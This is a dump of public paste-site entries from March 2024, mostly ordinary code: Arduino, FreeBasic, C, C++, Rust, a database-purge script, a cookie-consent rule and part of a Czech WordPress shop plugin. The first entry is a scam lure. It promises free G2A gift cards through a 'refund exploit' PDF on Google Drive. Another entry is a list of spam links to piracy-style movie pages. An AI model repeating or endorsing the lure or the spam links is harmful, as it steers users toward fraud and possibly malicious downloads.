id,title,username,language,date,content
bTazyZup,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Friday 1st of March 2024 11:47:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_737864.pdf

Working as of:
01 March 2024"
VyufiarZ,get-contract,jgeorget,CSS,Friday 1st of March 2024 11:47:34 AM CDT,"{
	""travel"": {
		""departure_country"": ""FRA"",
		""first_travel_country"": ""USA"",
		""departure_date"": ""2024-04-01"",
		""return_date"": ""2024-05-01"",
		""number_of_beneficiaries"": 2
	},
	""purchases"": [
		{
			""product"": {
				""type"": ""insurance"",
				""name"": ""ISA Premium plan""
			},
			""price"": 42,
			""currency"": ""USD"",
			""quantity"": 1
		}
	],
	""customer"": {
		""firstname"": ""Jack"",
		""lastname"": ""Dawson"",
		""address"": ""Chippewa Falls, Wisconsin"",
		""country_of_residence"": ""USA"",
		""phone"": ""1-234-45678"",
		""email"": ""jack.dawson@white-star-line.tld"",
		""alternate_email"": ""jack.dawson@tmail.tld"",
		""birthdate"": ""1992-04-10"",
		""lang"": ""en""
	},
	""beneficiaries"": [
		{
			""firstname"": ""Jack"",
			""lastname"": ""Dawson"",
			""passport_number"": ""U123456789"",
			""nationality"": ""USA"",
			""birthdate"": ""1992-04-10""
		},
		{
			""firstname"": ""Rose"",
			""lastname"": ""DeWitt Bukater"",
			""passport_number"": ""U234567890"",
			""nationality"": ""USA"",
			""birthdate"": ""1995-10-04""
		}
	],
	""payment"": {
		""status"": ""paid"",
		""transaction_id"": ""123456789etc"",
		""nb_product"": 1,
		""total"": 42,
		""currency"": ""USD""
	},
	""callback"": ""https://webhook.trip.com/insurte/01234567-89ab-cdef-1234-567890abcdef""
}"
k5dbNjLE,Control Motor PAP nema 11 con A4988,AntonioVillanueva,Arduino,Friday 1st of March 2024 11:29:30 AM CDT,"/*        Control MOTOR NEMA 11 con A4988 y Arduino
 *                Antonio Villanueva Segura
 *                          A4988
 *                    /ENABLE    VMOT +8V
 *                    MS1       GND GND
 *                    MS2       2B   AZUL (NEMA 11)
 *                    MS3       2A   ROJO (NEMA 11)
 *     cable a SLEEP  RESET     1A   NEGRO (NEMA 11)
 *     cable a RESET  SLEEP     1B   VERDE (NEMA 11)
 *    (PIN 2 ARDUINO )STEP      VDD +5V_ARDUINO 
 *    (PIN 5 ARDUINO) DIR       GND GND GND_ARDUINO
 */
/**************************************************************************************************************/
//Definiciones de PINs en el ARDUINO uno
#define EN 8 /* Habilita A4988 */
#define DIR 5 /* Sentido de giro */
#define STEP 2 /* Pasos */
/**************************************************************************************************************/
//Variables globales
float angulo(-1); //Seleccion
int pasos(0);
/**************************************************************************************************************/
void setup()//Configuracion 
{
  Serial.begin(9600);//Velocidad puerto serie

  pinMode(EN, OUTPUT);//PIN ENABLE como salida
  pinMode(DIR, OUTPUT);//DIR como salida
  pinMode(STEP, OUTPUT);//STEP como salida
  digitalWrite(EN, HIGH); //Ponemos a nivel bajo ENABLE , habilita A4988
}
/**************************************************************************************************************/
void sentidoGiro(boolean sentido){//Sentido de giro
    digitalWrite(DIR, sentido);
}
/**************************************************************************************************************/
void unPaso(){//Un paso
  digitalWrite(EN, LOW); //LOW a4988 activo
  
  digitalWrite(STEP, HIGH);//Crea el paso
  delay(1);
  digitalWrite(STEP, LOW);
  delay(1);  
}
/**************************************************************************************************************/
//Traduce el Angulo a una secuencia de pasos 
int AnguloPasos(float angulo_new){//Paso entero
  int mult(1); 
  return (abs (angulo_new) / 1.8)*mult;
}
/**************************************************************************************************************/
//Lee una cadena de texto del puerto serie
String leeCadena(){
  String cadena="""";
  if (Serial.available()) {cadena = Serial.readStringUntil('\n');}
  return cadena;
}
/**************************************************************************************************************/
//Menu lectura Serie, devuelve un int valor de Angulo
float menu(){
  Serial.print (""Angulo :"");
  String lectura="""";
  while (lectura== """" ){lectura=leeCadena();}//Espera un valor numerico dee grados
  Serial.println (lectura);//Muestra el numero de pasos 
  return lectura.toFloat();
}
/**************************************************************************************************************/
/**************************************************************************************************************/
/**************************************************************************************************************/
void loop()//Bucle principal ARDUINO
{

  angulo = menu();//Muestra mensaje y espera un Angulo
  pasos=AnguloPasos(angulo);//Traduce el angulo a numero de pasos 

  sentidoGiro (angulo ? true :false);//Selecciona sentido angulo + o -
  
  while (pasos--){unPaso();}//Ejecuta el numero de pasos

}"
uMRRtYuv,Untitled,Mysoft,FreeBasic,Friday 1st of March 2024 11:24:49 AM CDT,"type filestruct
  path as zstring*256
  file as zstring*64
  ext as zstring*4
end type

function f_ret_filestruct ( s as string ) as filestruct
  var iLen = len(s)
  return type<filestruct>( _
    left(s, instrrev(s, ""\"", iLen)), _
    mid(s, 1 + instrrev(s, ""\"", iLen)), _
    mid(s, 1 + instrrev(s, ""."",iLen)) _
  )
end function

var t = f_ret_filestruct(""c:\hello\file.txt"")
print t.path
print t.file
print t.ext
sleep

"
X0HBUUCw,Untitled,Mysoft,FreeBasic,Friday 1st of March 2024 11:07:53 AM CDT,"push 30
push 20
push 10
mov dword ptr [ebp-16], 0
mov dword ptr [ebp-12], 0
mov dword ptr [ebp-8], 0
lea eax, [ebp-16]
push eax
call _WHATEVER@12
"
h67MrNKd,Untitled,Josif_tepe,C++,Friday 1st of March 2024 10:58:57 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int n;
    cin >> n;
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    
    double sum = 0.0;
    for(int i = 0; i < n; i++) {
        sum += niza[i];
    }
    sum /= n;
    double najbliska_razlika = 2000000000;
    int kukja;
    
    for(int i = 0; i < n; i++) {
        if(fabs(sum - niza[i]) < najbliska_razlika) {
            najbliska_razlika = fabs(sum - niza[i]);
            kukja = niza[i];
        }
    }
    cout << kukja << endl;
    return 0;
}

"
8ML7nz5M,Untitled,Mysoft,C,Friday 1st of March 2024 10:51:34 AM CDT,"struct $5CHECK __stdcall WHATEVER( int32 A$1, int32 B$1, int32 C$1 )
{
	struct $5CHECK fb$result$1;
	__builtin_memset( &fb$result$1, 0, 12 );
	label$2:;
	*(int32*)&fb$result$1 = A$1;
	*(int32*)((uint8*)&fb$result$1 + 4) = B$1;
	*(int32*)((uint8*)&fb$result$1 + 8) = C$1;
	goto label$3;
	label$3:;
	return fb$result$1;
}

__attribute__(( constructor )) static void fb_ctor__chk( void )
{
	label$0:;
	struct $5CHECK TTEMP$0;
	struct $5CHECK vr$0 = WHATEVER( 10, 20, 30 );
"
dL3TVPcn,Untitled,Mysoft,FreeBasic,Friday 1st of March 2024 10:48:57 AM CDT,"type Check
  as long A,B,C
end type   
function Whatever(A as long,B as long,C as long) as Check  
  return type<Check>(A,B,C)   
 end function

var tTemp = Whatever(10,20,30)
print tTemp.A
print tTemp.B
print tTemp.C

sleep
"
qB9zheLq,Party Time,drak138,JavaScript,Friday 1st of March 2024 10:47:07 AM CDT,"function partyTime(arr){
    let guests={}
    let command=arr.shift()
// Изкарвам хората които са в чакалнята за партито
    while(command!==""PARTY""){
        guests[command]=command
        command=arr.shift()
    }
// Отделям местата които са резервирани
    let reservations=arr

// Проверявам дали човекът има резервация ако има той се изкарва от чакалнята
    reservations.forEach(savedSeat => {
        if(guests.hasOwnProperty(savedSeat)){
            delete guests[savedSeat]
        }
    });

    guests=Object.entries(guests)

// Сортирам хората които са останали в чакалнята и нямат резервирани места
    let sortedGuests=guests.sort()
// Откирам колко хора не са на партито
    let guestCount=guests.length
    console.log(guestCount)
// Принтирам хората които не са на партито
    sortedGuests.forEach(guestInfo=>{
        let guestNumber=guestInfo[1]
        console.log(guestNumber)
    })
}
partyTime(['tSzE5t0p',
'9NoBUajQ',
'Ce8vwPmE',
'SVQXQCbc',
'7IK9Yo0h',
'PARTY',
'9NoBUajQ',
'Ce8vwPmE',
'SVQXQCbc'
])"
jEWJ3h9W,Untitled,Josif_tepe,C++,Friday 1st of March 2024 10:43:58 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int n;
    cin >> n;
    
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    
    int zbir = 0;
    for(int i = 0; i < n; i++) {
        zbir += niza[i];
    }
    cout << zbir << endl;
    return 0;
}

"
iX8pmkvi,Untitled,ZondaKeN,Rust,Friday 1st of March 2024 10:42:44 AM CDT,"// main.rs
#![allow(warnings)]

mod model;
mod view;
mod observer;
mod event;
mod controller;

use std::cell::RefCell;
use std::rc::Rc;

use model::Model;
use view::View;
use controller::Controller;

fn main() {
    let mut model = Model::new(42);

    let mut view = View::new();

    let mut controller = Controller::new(&mut model, &mut view);

    controller.run();
}

// model.rs
pub struct Model
{
    pub x: i32
}

impl Model
{
    pub fn new(x: i32) -> Self
    {
        return Self { x };
    }
}

// view.rs
use std::cell::RefCell;
use std::rc::Rc;
use read_input::InputBuild;
use read_input::prelude::input;

use crate::model::Model;
use crate::event::Event;

pub struct View
{
    pub input_submitted: Event<i32>
}

impl View
{
    pub fn new() -> Self
    {
        return Self
        {
            input_submitted: Event::<i32>::new()
        };
    }

    pub fn render(&self, model: &Model)
    {
        println!();
        println!(""Render... (x = {})"", &model.x);
        let input: i32 = input().repeat_msg(""Input = "").get();
        self.input_submitted.invoke(input);
    }
}

// controller.rs
use std::cell::RefCell;
use std::rc::Rc;
use crate::model::Model;
use crate::observer::Observer;
use crate::view::View;

pub struct Controller<'a>
{
    model: &'a mut Model,
    view: &'a View,
}

impl<'a> Controller<'a>
{
    pub fn new(model: &'a mut Model, view: &'a mut View, x: impl Default) -> Self
    {
        let observer = ViewObserver { model };
        view.input_submitted.subscribe(Box::new(observer));
        let controller = Controller { model, view };
        return controller;
    }

    pub fn run(&mut self)
    {
        loop
        {
            self.view.render(self.model);
        }
    }
}

struct ViewObserver<'a>
{
    model: &'a mut Model
}

impl Observer<i32> for ViewObserver<'_>
{
    fn invoke(&self, arg1: i32)
    {
        println!(""Input received (x = {})"", arg1);
    }
}

// event.rs
use crate::observer::Observer;

pub struct Event<T1>
{
    subscribers: Vec<Box<dyn Observer<T1>>>
}

impl<T1> Event<T1> where T1 : Clone
{
    pub fn new() -> Self
    {
        return Self
        {
            subscribers: Vec::new()
        };
    }

    pub fn subscribe(&mut self, arg: Box<dyn Observer<T1>>)
    {
        self.subscribers.push(arg);
    }

    pub fn invoke(&self, arg1: T1)
    {
        for subscriber in &self.subscribers
        {
            subscriber.invoke(arg1.clone());
        }
    }
}

// observer.rs
pub trait Observer<T1>
{
    fn invoke(&self, arg1: T1);
}"
29vagBuk,solab4pb3,STANAANDREY,C,Friday 1st of March 2024 10:27:23 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <string.h>
#define MAX(a, b) a > b ? a : b
#define MIN(a, b) a < b ? a : b

int getFD(const char *const path, int flags, int perm) {
  int fd = open(path, flags, perm);
  if (fd < 0) {
    perror(""Open err: "");
    exit(1);
  }
  return fd;
}

void closeFD(int fd) {
  if (close(fd) < 0) {
    perror(""Close err: "");
    exit(1);
  }
}

int main(int argc, char *argv[]) {
  if (argc != 3) {
    fprintf(stderr, ""Wrong usage!\n"");
    exit(1);
  }

  int fd1 = getFD(argv[1], O_RDONLY, 0);
  
  int nr;
  int max = INT_MIN, min = INT_MAX;
  int cnt = 0, sum = 0;
  while (read(fd1, &nr, sizeof(int))) {
    min = MIN(min, nr);
    max = MAX(max, nr);
    sum += nr;
    cnt++;
  }
  
  int fd2 = getFD(argv[2], O_RDWR | O_CREAT, S_IWUSR | S_IRUSR);

  char template[50] = """"; 
  sprintf(template, "" Min: %d\n Max: %d\n Mean: %lf\n"", min, max, 1.0 * sum/cnt);
  size_t templateLen = strlen(template);
  if (write(fd2, template, templateLen) == -1) {
    perror(""Write err: "");
    exit(1);
  }
   
  closeFD(fd1);
  closeFD(fd2);
  return 0;
}
"
bpbWcyiU,Untitled,Josif_tepe,C++,Friday 1st of March 2024 10:24:19 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int a, b, c;
    cin >> a >> b >> c;
    int vtor_lift = abs(b - c) + c;
    
    if(a == vtor_lift) {
        cout << 0 << endl;
    }
    else if(a < vtor_lift) {
        cout << 1 << endl;
    }
    else {
        cout << 2 << endl;
    }
    return 0;
}

"
1jW992JD,Untitled,Josif_tepe,C++,Friday 1st of March 2024 10:13:29 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int n;
    cin >> n;
    
    int x = (n * 2) / 3;
    if(x % 2 == 1) {
        x++;
    }
    cout << x << endl;
    
    return 0;
}

"
gPy9DGGj,Untitled,Namielus,JSON,Friday 1st of March 2024 10:04:17 AM CDT,"{
    ""$schema"": ""https://raw.githubusercontent.com/cavi-au/Consent-O-Matic/master/rules.schema.json"",
    ""cdek.ru"": {
        ""detectors"": [
            {
                ""presentMatcher"": [
                    {
                        ""type"": ""css"",
                        ""target"": {
                            ""selector"": "".cookie-alert""
                        }
                    }
                ],
                ""showingMatcher"": [
                    {
                        ""type"": ""css"",
                        ""target"": {
                            ""selector"": "".cookie-alert"",
                            ""displayFilter"": true
                        }
                    }
                ]
            }
        ],
        ""methods"": [
            {
                ""action"": {
                    ""type"": ""hide"",
                    ""target"": {
                        ""selector"": "".cookie-alert""
                    }
                },
                ""name"": ""HIDE_CMP""
            },
            {
                ""name"": ""OPEN_OPTIONS""
            },
            {
                ""name"": ""DO_CONSENT""
            },
            {
                ""action"": {
                    ""type"": ""click"",
                    ""target"": {
                        ""selector"": "".cookie-alert .cdek-button""
                    }
                },
                ""name"": ""SAVE_CONSENT""
            },
            {
                ""name"": ""UTILITY""
            }
        ]
    }
}"
Cx5CcLRD,Untitled,chrissharp123,Bash,Friday 1st of March 2024 09:55:02 AM CDT,"#!/bin/bash

DB_HOST=""db01""
DB_USER=""evergreen""
PSQL=""/usr/bin/psql""
VACUUMDB=""/usr/bin/vacuumdb""
KEEP_ONE_YEAR=""actor_usr_history""
KEEP_SIX_MONTHS=""actor_usr_address_history""
KEEP_THREE_MONTHS=""asset_call_number_history asset_copy_history biblio_record_entry_history"" 

INTERVAL=""1 year""
for table in $KEEP_ONE_YEAR; do
$PSQL -U $DB_USER -h $DB_HOST -c ""DELETE FROM auditor.$table WHERE audit_time < now() - '$INTERVAL'::interval""
PGHOST=$DB_HOST PGUSER=$DB_USER $VACUUMDB --analyze --table auditor.$table
done

INTERVAL=""6 months""
for table in $KEEP_SIX_MONTHS; do
$PSQL -U $DB_USER -h $DB_HOST -c ""DELETE FROM auditor.$table WHERE audit_time < now() - '$INTERVAL'::interval""
PGHOST=$DB_HOST PGUSER=$DB_USER $VACUUMDB --analyze --table auditor.$table
done

INTERVAL=""3 months""
for table in $KEEP_THREE_MONTHS; do
$PSQL -U $DB_USER -h $DB_HOST -c ""DELETE FROM auditor.$table WHERE audit_time < now() - '$INTERVAL'::interval""
PGHOST=$DB_HOST PGUSER=$DB_USER $VACUUMDB --analyze --table auditor.$table
done
"
DB5jVbC8,Chebs 1,Mauijam,JSON,Friday 1st of March 2024 09:45:53 AM CDT,"[
'A',
'B',
'C',
'D',
'E',
'F',
'G',
'H',
'I',
'J',
'K',
'L',
'M',
'N',
'O',
'P',
'Q',
'R',
'S',
'T',
'U',
'V',
'W',
'X',
'Y',
'Z',
',
]"
y4mMZ5pZ,BLAEMBLAEM,gadungw71,PHP,Friday 1st of March 2024 09:36:16 AM CDT,"•	https://www.charidy.com/1709277936792637642
•	https://www.charidy.com/1709278381723572741
•	https://www.charidy.com/1709278876270059907
•	https://www.charidy.com/1709296963955181154
•	https://www.charidy.com/1709297371270203726
•	https://www.charidy.com/1709299395749799608
•	https://www.charidy.com/1709301823526735796
•	https://www.charidy.com/1709302058378368674
•	https://www.taskade.com/p/2024-4-k-1080p-full-hd-01HQWFWMNJSENSS3FEPPRFZDJ7
•	https://www.taskade.com/p/2-2024-4-k-1080p-full-hd-01HQWG34RZ5AH7CE2HZZ58G6VJ
•	https://www.taskade.com/p/2024-4-k-1080p-full-hd-01HQWG9Y6YD2M11HY8C54VQSY4
•	https://frnmkc7002.expandcart.com/index.php?route=product/product&product_id=373
•	https://frnmkc7002.expandcart.com/index.php?route=product/product&product_id=374
•	https://kpvezp3388.expandcart.com/index.php?route=product/product&product_id=373
•	https://kpvezp3388.expandcart.com/index.php?route=product/product&product_id=374
•	https://wsrpgq5817.expandcart.com/index.php?route=product/product&product_id=373
•	https://wsrpgq5817.expandcart.com/index.php?route=product/product&product_id=374
•	https://github.com/phimmaifullhd2024
•	https://github.com/orgs/mobiggr/discussions/4239
•	https://github.com/pivalunakat23
•	https://github.com/orgs/mobiggr/discussions/4249
•	https://github.com/nocenupaqoz25
•	https://github.com/orgs/mobiggr/discussions/4285
•	https://github.com/mededoracaj26
•	https://github.com/orgs/mobiggr/discussions/4290
•	https://vk.com/@715280709-hd1080p4k
•	https://vk.com/@blurayhd1080p-imissyouhd1080p4k
•	https://dailybusinesspost.com/unveiling-the-path-to-power-inside-demon-slayer-kimetsu-no-yaiba-to-the-hashira-training/
•	https://demo.hedgedoc.org/s/NgKaPdmTD
•	https://hackmd.io/@rerewilli6/SkHp4O16p
•	https://paiza.io/projects/tLt-BOiYcTB4bbgV-sDGgg?language=php
•	https://pastelink.net/4x3qqn50
•	https://snippet.host/spyxbk
•	https://tempaste.com/hnMRhjUniIb
•	https://rentry.co/chwa7of7
•	https://binshare.net/lcIk6utxwc8GwUCyIm2p
•	https://rift.curseforge.com/paste/9dbe1ff1
•	https://telegra.ph/TEGANYATEGANYA-03-01
"
h11Qk8xU,daf,laciikee,PHP,Friday 1st of March 2024 09:32:36 AM CDT,"<?php
/**
 * Plugin Name: České služby pro WordPress
 * Plugin URI: https://www.separatista.net
 * Description: Implementace různých českých služeb do WordPressu.
 * Version: 0.6-alpha
 * Author: Pavel Hejn
 * Author URI: https://www.separatista.net
 * GitHub Plugin URI: pavelevap/ceske-sluzby 
 * License: GPL2
 */

define( 'CS_VERSION', '0.6-alpha' );

$language = get_locale();
if ( $language == ""sk_SK"" ) {
  define( ""HEUREKA_URL"", ""heureka.sk"" );
  define( ""GLAMI_URL"", ""glami.sk"" );
  define( ""HEUREKA_KONVERZE"", ""https://im9.cz/sk/js/ext/2-roi-async.js"" );
  define( ""GOOGLE_MENA"", ""EUR"" );
}
else {
  define( ""HEUREKA_URL"", ""heureka.cz"" );
  define( ""GLAMI_URL"", ""glami.cz"" );
  define( ""HEUREKA_KONVERZE"", ""https://im9.cz/js/ext/1-roi-async.js"" );
  define( ""GOOGLE_MENA"", ""CZK"" );
}

function ceske_sluzby_heureka_overeno_zakazniky( $order_id, $posted ) {
  $api = get_option( 'wc_ceske_sluzby_heureka_overeno-api' );
  $souhlas = get_option( 'wc_ceske_sluzby_heureka_overeno-souhlas' );
  $souhlas_check = array();
  $souhlas_text = """";
  if ( ! empty( $souhlas ) ) {
    if ( $souhlas == 'souhlas_optout' && isset( $_POST['heureka_overeno_zakazniky_souhlas_optout'] ) && (int)$_POST['heureka_overeno_zakazniky_souhlas_optout'] == 1 ) {
      $souhlas_check = array( $souhlas => current_time( 'mysql' ) );
      $souhlas_text = 'Objednávka byla úspěšně odeslána do služby Ověřeno zákazníky (Heureka) a zákazník neodmítl navržený souhlas se zpracováním dat.';
    }
    if ( $souhlas == 'nesouhlas_optout' && ! isset( $_POST['heureka_overeno_zakazniky_nesouhlas_optout'] ) ) {
      $souhlas_check = array( $souhlas => current_time( 'mysql' ) );
      $souhlas_text = 'Objednávka byla úspěšně odeslána do služby Ověřeno zákazníky (Heureka) a zákazník nepotvrdil nesouhlas se zpracováním dat.';
    }
  } else {
    $souhlas_check = array( 'neaktivni' => current_time( 'mysql' ) );
    $souhlas_text = 'Objednávka byla úspěšně odeslána do služby Ověřeno zákazníky (Heureka).';
  }
  if ( ! empty( $api ) && ! empty( $souhlas_check ) ) {
    $order = wc_get_order( $order_id );
    
    // https://github.com/heureka/heureka-overeno-php-api
    require_once( dirname( __FILE__ ) . '/src/heureka/HeurekaOvereno.php' );
    
    $language = get_locale();
    try {
      if ( $language == ""sk_SK"" ) {
        $overeno = new HeurekaOvereno( $api, HeurekaOvereno::LANGUAGE_SK );
      }
      else {
        $overeno = new HeurekaOvereno( $api );
      }
      $overeno->setEmail( $posted['billing_email'] );

      $items = $order->get_items();
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        foreach ( $items as $item_data ) {
          $overeno->addProduct( $item_data['name'] );
        }
      } else {
        foreach ( $items as $item_id => $item_data ) {
          $aktivace_xml = get_option( 'wc_ceske_sluzby_heureka_xml_feed-aktivace' );
          $product = $item_data->get_product();
          if ( $aktivace_xml == ""yes"" ) {
            $overeno->addProductItemId( $product->get_id() );
          } else {
            $overeno->addProduct( $product->get_name() );
          }
        }
      }

      $overeno->addOrderId( $order_id );
      $overeno->send();
      update_post_meta( $order_id, 'ceske_sluzby_heureka_overeno_zakazniky_souhlas', $souhlas_check );
      $order->add_order_note( $souhlas_text );
    }
    catch ( OverflowException $o ) {
      $order->add_order_note( 'API klíč pro službu Ověřeno zákazníky nebyl správně nastaven: ' . $o->getMessage() );
    }
    catch ( HeurekaOverenoException $e ) {
      $order->add_order_note( 'Odeslání dat pro službu Ověřeno zákazníky se nezdařilo: ' . $e->getMessage() );
    }
  }
}

function ceske_sluzby_heureka_mereni_konverzi( $order_id ) {
  $api = get_option( 'wc_ceske_sluzby_heureka_konverze-api' );
  if ( ! empty( $api ) ) {
    $order = wc_get_order( $order_id );
    $items = $order->get_items(); ?>

<script type=""text/javascript"">
var _hrq = _hrq || [];
    _hrq.push(['setKey', '<?php echo $api; ?>']);
    _hrq.push(['setOrderId', '<?php echo $order_id; ?>']);
    <?php if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
      foreach ( $items as $item ) {
        $cena = wc_format_decimal( $order->get_item_subtotal( $item ) );
        echo ""_hrq.push(['addProduct', '"" . $item['name'] . ""', '"" . $cena . ""', '"" . $item['qty'] . ""']);"";
      } 
    } else {
      foreach ( $items as $item_id => $item_data ) {
        $product = $item_data->get_product();
        $cena = wc_format_decimal( $item_data->get_total() / $item_data->get_quantity() );
        echo ""_hrq.push(['addProduct', '"" . $product->get_name() . ""', '"" . $cena . ""', '"" . $item_data->get_quantity() . ""']);"";
      }  
    } ?>
    _hrq.push(['trackOrder']);

(function() {
    var ho = document.createElement('script'); ho.type = 'text/javascript'; ho.async = true;
    ho.src = '<?php echo HEUREKA_KONVERZE; ?>';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ho, s);
})();
</script>

<?php
  }
}

function ceske_sluzby_heureka_certifikat_spokojenosti() {
  $api = get_option( 'wc_ceske_sluzby_heureka_konverze-api' );
  $certifikat = get_option( 'wc_ceske_sluzby_heureka_certifikat_spokojenosti-aktivace' );
  if ( ! empty( $api ) && $certifikat == ""yes"" ) {
    $umisteni = get_option( 'wc_ceske_sluzby_heureka_certifikat_spokojenosti_umisteni' );
    $odsazeni = get_option( 'wc_ceske_sluzby_heureka_certifikat_spokojenosti_odsazeni' );
    if ( ! empty( $umisteni ) ) {
      if ( $umisteni == ""vlevo"" ) {
        $umisteni = 21;
      } else {
        $umisteni = 22;
      }
    } else {
      $umisteni = 21;
    }
    if ( empty( $odsazeni ) ) {
      $odsazeni = 60;
    }
  ?>
    
<script type=""text/javascript"">
//<![CDATA[
var _hwq = _hwq || [];
    _hwq.push(['setKey', '<?php echo $api; ?>']);_hwq.push(['setTopPos', '<?php echo $odsazeni; ?>']);_hwq.push(['showWidget', '<?php echo $umisteni; ?>']);(function() {
    var ho = document.createElement('script'); ho.type = 'text/javascript'; ho.async = true;
    ho.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.<?php echo HEUREKA_URL; ?>/direct/i/gjs.php?n=wdgt&sak=<?php echo $api; ?>';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ho, s);
})();
//]]>
</script>

<?php
  }
}

function ceske_sluzby_sklik_mereni_konverzi( $order_id ) {
  $konverze = get_option( 'wc_ceske_sluzby_sklik_konverze-objednavky' );
  if ( ! empty( $konverze ) ) {
    $order = wc_get_order( $order_id );
    $hodnota_objednavky = round( $order->get_subtotal() ); ?>
<!-- Měřicí kód Sklik.cz -->
<iframe width=""119"" height=""22"" frameborder=""0"" scrolling=""no"" src=""//c.imedia.cz/checkConversion?c=<?php echo $konverze; ?>&color=ffffff&v=<?php echo $hodnota_objednavky; ?>""></iframe>
  <?php
  }
}

function ceske_sluzby_sklik_retargeting() {
  $konverze = get_option( 'wc_ceske_sluzby_sklik_retargeting' );
  if ( ! empty( $konverze ) ) { ?>
<script type=""text/javascript"">
/* <![CDATA[ */
var seznam_retargeting_id = <?php echo $konverze; ?>;
/* ]]> */
</script>
<script type=""text/javascript"" src=""//c.imedia.cz/js/retargeting.js""></script>
  <?php
  }
}

function ceske_sluzby_srovname_mereni_konverzi( $order_id ) {
  $klic = get_option( 'wc_ceske_sluzby_srovname_konverze-objednavky' );
  if ( ! empty( $klic ) ) {
    $order = wc_get_order( $order_id );
    $items = $order->get_items(); ?>

<script type=""text/javascript"">
var _srt = _srt || [];
    _srt.push(['_setShop', '<?php echo $klic; ?>']);
    _srt.push(['_setTransId', '<?php echo $order_id; ?>']);
    <?php if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
      foreach ( $items as $item ) {
        $cena = wc_format_decimal( $order->get_item_subtotal( $item ) );
        echo ""_srt.push(['_addProduct', '"" . $item['name'] . ""', '"" . $cena . ""', '"" . $item['qty'] . ""']);"";
      }
    } else {
      foreach ( $items as $item_id => $item_data ) {
        $product = $item_data->get_product();
        $cena = wc_format_decimal( $item_data->get_total() / $item_data->get_quantity() );
        echo ""_srt.push(['_addProduct', '"" . $product->get_name() . ""', '"" . $cena . ""', '"" . $item_data->get_quantity() . ""']);"";
      }
    } ?>
    _srt.push(['_trackTrans']);

(function() {
    var s = document.createElement(""script"");
    s.type = ""text/javascript"";
    s.async = true;
    s.src = (""https:"" == document.location.protocol ? ""https"" : ""http"") + ""://www.srovname.cz/js/track-trans.js"";
    var x = document.getElementsByTagName(""script"")[0];
    x.parentNode.insertBefore(s, x);
})();
</script>

<?php
  }
}

function ceske_sluzby_zbozi_mereni_konverzi( $order_id ) {
  $id_obchodu = get_option( 'wc_ceske_sluzby_zbozi_konverze_id-obchodu' );
  if ( ! empty( $id_obchodu ) ) {
    $order = wc_get_order( $order_id );
    $hodnota_objednavky = number_format( (float)( $order->get_total() ), 2, '.', '' ); ?>

<script>
(function(w,d,s,u,n,k,c,t){w.ZboziConversionObject=n;w[n]=w[n]||function(){
(w[n].q=w[n].q||[]).push(arguments)};w[n].key=k;c=d.createElement(s);
t=d.getElementsByTagName(s)[0];c.async=1;c.src=u;t.parentNode.insertBefore(c,t)
})(window,document,""script"",""https://www.zbozi.cz/conversion/js/conv.js"",""zbozi"",""<?php echo $id_obchodu; ?>"");
zbozi(""setOrder"",{
""orderId"": ""<?php echo $order_id; ?>"",
""totalPrice"": ""<?php echo $hodnota_objednavky; ?>""
});
zbozi(""send"");
</script>

<?php
  }
}

function ceske_sluzby_sledovani_zasilek_email( $email_classes ) {
  require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-sledovani-zasilek-email.php';
  $email_classes['WC_Email_Ceske_Sluzby_Sledovani_Zasilek'] = new WC_Email_Ceske_Sluzby_Sledovani_Zasilek();
  return $email_classes;
}

function ceske_sluzby_sledovani_zasilek_email_akce( $email_actions ) {
  $email_actions[] = 'woocommerce_ceske_sluzby_sledovani_zasilek_email_akce';
  return $email_actions;
}
 
function ceske_sluzby_kontrola_aktivniho_pluginu() {
  if ( defined( 'WOOCOMMERCE_VERSION' ) && version_compare( WOOCOMMERCE_VERSION, '2.2', '>=' ) ) {
    require_once plugin_dir_path( __FILE__ ) . 'includes/ceske-sluzby-functions.php';
    if ( is_admin() ) {
      require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-admin.php';
      require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-sledovani-zasilek.php';
      WC_Settings_Tab_Ceske_Sluzby_Admin::init();
      require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-product-tab.php';
      require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-varianty.php';
      new WC_Product_Tab_Ceske_Sluzby_Admin();
      $xml_feed = get_option( 'wc_ceske_sluzby_heureka_xml_feed-aktivace' );
      if ( $xml_feed == ""yes"" ) {
        add_action( 'product_cat_add_form_fields', 'ceske_sluzby_xml_kategorie_pridat_pole', 99 );
        add_action( 'product_cat_edit_form_fields', 'ceske_sluzby_xml_kategorie_upravit_pole', 99 );
        add_action( 'created_term', 'ceske_sluzby_xml_kategorie_ulozit', 20, 3 );
        add_action( 'edit_term', 'ceske_sluzby_xml_kategorie_ulozit', 20, 3 );
        add_filter( 'manage_edit-product_cat_columns', 'ceske_sluzby_xml_kategorie_pridat_sloupec' );
        add_filter( 'manage_product_cat_custom_column', 'ceske_sluzby_xml_kategorie_sloupec', 10, 3 );
      }
    }

    add_action( 'woocommerce_shipping_init', 'ceske_sluzby_doprava_ulozenka_init' );
    add_filter( 'woocommerce_shipping_methods', 'ceske_sluzby_doprava_ulozenka' );

    add_action( 'woocommerce_shipping_init', 'ceske_sluzby_doprava_dpd_parcelshop_init' );
    add_filter( 'woocommerce_shipping_methods', 'ceske_sluzby_doprava_dpd_parcelshop' );

